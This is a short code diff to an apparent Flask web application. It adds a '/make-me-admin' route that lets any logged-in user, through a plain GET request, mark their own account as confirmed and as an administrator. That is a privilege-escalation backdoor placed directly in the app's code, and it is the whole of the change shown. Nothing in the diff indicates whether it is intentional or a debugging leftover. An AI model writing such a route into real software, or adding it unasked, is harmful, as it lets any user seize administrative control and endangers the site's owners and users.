@@ -67,6 +67,17 @@ def logout():
     return redirect('/'), 200
 
 
+@app.route('/make-me-admin', methods = ['GET'])
+@login_required
+def make_admin():
+    id = session.get('user_id')
+    user = User.query.filter_by(id=id).first()
+    user.is_confirm = 1
+    user.is_admin = 1
+    db.session.commit()
+    return redirect('/'), 200
+
+
 @app.route('/register', methods = ['POST'])
 def register():
     user = User.query.filter_by(email=request.form.get('email')).first()
